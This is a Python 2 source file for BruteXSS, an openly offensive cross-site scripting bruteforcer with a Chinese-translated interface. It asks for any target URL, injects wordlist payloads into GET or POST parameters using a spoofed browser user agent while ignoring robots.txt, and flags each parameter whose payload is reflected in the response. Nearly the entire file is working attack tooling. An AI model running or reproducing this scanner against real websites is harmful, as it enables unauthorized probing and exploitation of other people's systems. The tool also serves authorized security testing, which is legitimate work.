#!/usr/bin/env python
#-*-coding:gbk-*-
#!BruteXSS
#!Cross-Site Scripting Bruteforcer
#!Author: Sinyer
#!Site: http://www.cnblogs.com/Pitcoft/

from string import whitespace
import httplib
import urllib
import socket
import urlparse
import os
import sys
import time
from colorama import init , Style, Back,Fore
import mechanize
import httplib
init()
banner = """                                                                                       
  ____             _        __  ______ ____  
 | __ ) _ __ _   _| |_ ___  \ \/ / ___/ ___| 
 |  _ \| '__| | | | __/ _ \  \  /\___ \___ \ 
 | |_) | |  | |_| | ||  __/  /  \ ___) |__) |
 |____/|_|   \__,_|\__\___| /_/\_\____/____/    (适用于python2.7)
 
 原作者: Shawar Khan
 汉化人员：Pitcoft_vvv
 注意:如果使用定义不正确的有效载荷
 字典可能给你带来误报
 更好地使用字典才能
 给你提供更积极的结果。
"""
def brutexss():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
	print banner
	def again():
		inp = raw_input("[?] [E]结束进程\[A]再次启动(程序初始化)").lower()
		if inp == 'a':
			brutexss()
		elif inp == 'e':
			exit()
		else:
			print("[!] 不正确的选择")
			again()
	grey = Style.DIM+Fore.WHITE
	def wordlistimport(file,lst):
		try:
			with open(file,'r') as f: #Importing Payloads from specified wordlist.
				print(Style.DIM+Fore.WHITE+"[+] 从指定字典加载有效载荷....."+Style.RESET_ALL)
				for line in f:
					final = str(line.replace("\n",""))
					lst.append(final)
		except IOError:
			print(Style.BRIGHT+Fore.RED+"[!] 字典未找到!"+Style.RESET_ALL)
			again()
	def bg(p,status):
		try:
			b = ""
			l = ""
			lostatus = ""
			num = []
			s = len(max(p, key=len)) #list
			if s < 10:
				s = 10
			for i in range(len(p)): num.append(i)
			maxval = str(len(num)) #number
			for i in range(s) : b = b + "-"
			for i in range(len(maxval)):l = l + "-"
			statuslen = len(max(status, key=len))
			for i in range(statuslen) : lostatus = lostatus + "-"
			if len(b) < 10 :
				b = "----------"
			if len(lostatus) < 14:
				lostatus="--------------"
			if len(l) < 2 :
				l = "--"
			los = statuslen
			if los < 14:
				los = 14
			lenb=len(str(len(b)))
			if lenb < 14:
				lenb = 10
			else:
				lenb = 20
			upb = ("+-%s-+-%s-+-%s-+")%(l,b,lostatus)
			print(upb)
			st0 = "参数"
			st1 = "状态"
			print("| Id | "+st0.center(s," ")+" | "+st1.center(los," ")+" |")
			print(upb)
			for n,i,d in zip(num,p,status):
			    string = (" %s | %s ")%(str(n),str(i));
			    lofnum = str(n).center(int(len(l))," ")
			    lofstr = i.center(s," ")
			    lofst = d.center(los," ")
			    if "Not Vulnerable" in lofst:
			    	lofst = Fore.GREEN+d.center(los," ")+Style.RESET_ALL
			    else:
			    	lofst = Fore.RED+d.center(los," ")+Style.RESET_ALL
			    print("| "+lofnum+" | "+lofstr+" | "+lofst+" |")
			    print(upb)
			return("")
		except(ValueError):
			print(Style.BRIGHT+Fore.RED+"[!] URL中没有发现参数!"+Style.RESET_ALL)
			again()
	def complete(p,r,c,d):
		print("[+] Bruteforce完成。")
		if c == 0:
			print("[+] 咦!没有参数的URL "+Style.BRIGHT+Fore.GREEN+"不容易受到攻击"+Style.RESET_ALL+" to XSS.")
		elif c ==1:
			print("[+] %s 参数是 "+Style.BRIGHT+Fore.RED+"容易攻击的"+Style.RESET_ALL+" xss.")%c
		else:
			print("[+] %s 参数是 "+Style.BRIGHT+Fore.RED+"容易攻击的"+Style.RESET_ALL+" XSS.")%c
		print("[+] 扫描结果 %s:")%d
		print bg(p,r)
		again()
	def GET():
			try:
				try:
					grey = Style.DIM+Fore.WHITE
					site = raw_input("[?] 输入 URL:\n[?] > ") #Taking URL
					if 'https://' in site:
						pass
					elif 'http://' in site:
						pass
					else:
						site = "http://"+site
					finalurl = urlparse.urlparse(site)
					urldata = urlparse.parse_qsl(finalurl.query)
					domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
					domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
					print (Style.DIM+Fore.WHITE+"[+] 正在检测 "+domain+" 是否可用..."+Style.RESET_ALL)
					connection = httplib.HTTPConnection(domain)
					connection.connect()
					print("[+] "+Fore.GREEN+domain+" 可以使用!"+Style.RESET_ALL)
					url = site
					paraname = []
					paravalue = []
					wordlist = raw_input("[?] 输入字典的位置 (按Enter键使用默认字典 wordlist.txt)\n[?] > ")
					if len(wordlist) == 0:
						wordlist = 'wordlist.txt'
						print(grey+"[+] 使用默认字典..."+Style.RESET_ALL)
					else:
						pass
					payloads = []
					wordlistimport(wordlist,payloads)
					lop = str(len(payloads))
					grey = Style.DIM+Fore.WHITE
					print(Style.DIM+Fore.WHITE+"[+] "+lop+" 攻击载荷正在加载..."+Style.RESET_ALL)
					print("[+] Bruteforce开始:") 
					o = urlparse.urlparse(site)
					parameters = urlparse.parse_qs(o.query,keep_blank_values=True)
					path = urlparse.urlparse(site).scheme+"://"+urlparse.urlparse(site).netloc+urlparse.urlparse(site).path
					for para in parameters: #Arranging parameters and values.
						for i in parameters[para]:
							paraname.append(para)
							paravalue.append(i)
					total = 0
					c = 0
					fpar = []
					fresult = []
					progress = 0
					for pn, pv in zip(paraname,paravalue): #Scanning the parameter.
						print(grey+"[+] 测试 '"+pn+"' 参数..."+Style.RESET_ALL)
						fpar.append(str(pn))
						for x in payloads: #
							validate = x.translate(None, whitespace)
							if validate == "":
								progress = progress + 1
							else:
								sys.stdout.write("\r[+] %i / %s 攻击载荷注入..."% (progress,len(payloads)))
								sys.stdout.flush()
								progress = progress + 1
								enc = urllib.quote_plus(x)
								data = path+"?"+pn+"="+pv+enc
								page = urllib.urlopen(data)
								sourcecode = page.read()
								if x in sourcecode:
									print(Style.BRIGHT+Fore.RED+"\n[!]"+" Xss漏洞发现 \n"+Fore.RED+Style.BRIGHT+"[!]"+" 参数:\t%s\n"+Fore.RED+Style.BRIGHT+"[!]"+" Payload:\t%s"+Style.RESET_ALL)%(pn,x)
									fresult.append("  脆弱的  ")
									c = 1
									total = total+1
									progress = progress + 1
									break
								else:
									c = 0
						if c == 0:
							print(Style.BRIGHT+Fore.GREEN+"\n[+]"+Style.RESET_ALL+Style.DIM+Fore.WHITE+" '%s' parameter not vulnerable."+Style.RESET_ALL)%pn
							fresult.append("不脆弱")
							progress = progress + 1
							pass
						progress = 0
					complete(fpar,fresult,total,domain)
				except(httplib.HTTPResponse, socket.error) as Exit:
					print(Style.BRIGHT+Fore.RED+"[!] 网站 "+domain+" 是离线!"+Style.RESET_ALL)
					again()
			except(KeyboardInterrupt) as Exit:
				print("\n退出...")
	def POST():
		try:
			try:
				try:
					br = mechanize.Browser()
					br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11)Gecko/20071127 Firefox/2.0.0.11')]
					br.set_handle_robots(False)
					br.set_handle_refresh(False)
					site = raw_input("[?] 输入 URL:\n[?] > ") #Taking URL
					if 'https://' in site:
						pass
					elif 'http://' in site:
						pass
					else:
						site = "http://"+site
					finalurl = urlparse.urlparse(site)
					urldata = urlparse.parse_qsl(finalurl.query)
					domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
					domain = domain0.replace("https://","").replace("http://","").replace("www.","").replace("/","")
					print (Style.DIM+Fore.WHITE+"[+] 正在检测 "+domain+" 是否可用..."+Style.RESET_ALL)
					connection = httplib.HTTPConnection(domain)
					connection.connect()
					print("[+] "+Fore.GREEN+domain+" 可以使用！"+Style.RESET_ALL)
					path = urlparse.urlparse(site).scheme+"://"+urlparse.urlparse(site).netloc+urlparse.urlparse(site).path
					url = site
					param = str(raw_input("[?] 输入POST类型的参数: > "))
					wordlist = raw_input("[?] 输入字典的位置 (按Enter键使用默认字典 wordlist.txt)\n[?] > ")
					if len(wordlist) == 0:
						wordlist = 'wordlist.txt'
						print("[+] 使用默认字典...")
					else:
						pass
					payloads = []
					wordlistimport(wordlist,payloads)
					lop = str(len(payloads))
					grey = Style.DIM+Fore.WHITE
					print(Style.DIM+Fore.WHITE+"[+] "+lop+" 攻击载荷加载..."+Style.RESET_ALL)
					print("[+] Bruteforce start:")
					params = "http://www.analyz3r.cn/?"+param
					finalurl = urlparse.urlparse(params)
					urldata = urlparse.parse_qsl(finalurl.query)
					o = urlparse.urlparse(params)
					parameters = urlparse.parse_qs(o.query,keep_blank_values=True)
					paraname = []
					paravalue = []
					for para in parameters: #Arranging parameters and values.
						for i in parameters[para]:
							paraname.append(para)
							paravalue.append(i)
					fpar = []
					fresult = []
					total = 0
					progress = 0
					pname1 = [] #parameter name
					payload1 = []
					for pn, pv in zip(paraname,paravalue): #Scanning the parameter.
						print(grey+"[+] 测试 '"+pn+"' 参数..."+Style.RESET_ALL)
						fpar.append(str(pn))
						for i in payloads:
							validate = i.translate(None, whitespace)
							if validate == "":
								progress = progress + 1
							else:
								progress = progress + 1
								sys.stdout.write("\r[+] %i / %s 攻击载荷注入..."% (progress,len(payloads)))
								sys.stdout.flush()
								pname1.append(pn)
								payload1.append(str(i))
								d4rk = 0
								for m in range(len(paraname)):
									d = paraname[d4rk]
									d1 = paravalue[d4rk]
									tst= "".join(pname1)
									tst1 = "".join(d)
									if pn in d:
										d4rk = d4rk + 1
									else:
										d4rk = d4rk +1
										pname1.append(str(d))
										payload1.append(str(d1))
								data = urllib.urlencode(dict(zip(pname1,payload1)))
								r = br.open(path, data)
								sourcecode =  r.read()
								pname1 = []
								payload1 = []
								if i in sourcecode:
									print(Style.BRIGHT+Fore.RED+"\n[!]"+" XSS 漏洞发现! \n"+Fore.RED+Style.BRIGHT+"[!]"+" 参数:\t%s\n"+Fore.RED+Style.BRIGHT+"[!]"+" 攻击载荷:\t%s"+Style.RESET_ALL)%(pn,i)
									fresult.append("  脆弱的  ")
									c = 1
									total = total+1
									progress = progress + 1
									break
								else:
									c = 0
						if c == 0:
							print(Style.BRIGHT+Fore.GREEN+"\n[+]"+Style.RESET_ALL+Style.DIM+Fore.WHITE+" '%s' 参数不脆弱."+Style.RESET_ALL)%pn
							fresult.append("不脆弱")
							progress = progress + 1
							pass
						progress = 0
					complete(fpar,fresult,total,domain)
				except(httplib.HTTPResponse, socket.error) as Exit:
					print(Style.BRIGHT+Fore.RED+"[!] 网站 "+domain+" 是离线!"+Style.RESET_ALL)
					again()
			except(KeyboardInterrupt) as Exit:
				print("\n退出...")
		except (mechanize.HTTPError,mechanize.URLError) as e:
			print(Style.BRIGHT+Fore.RED+"\n[!] HTTP错误! %s %s"+Style.RESET_ALL)%(e.code,e.reason)
	try:
		methodselect = raw_input("[?] 选择方法: [G]GET 或者 [P]Post (G/P): ").lower()
		if methodselect == 'g':
			GET()
		elif methodselect == 'p':
			POST()
		else:
			print("[!] 这是不正确的方法选择.")
			again()
	except(KeyboardInterrupt) as Exit:
		print("\nExit...")

brutexss()
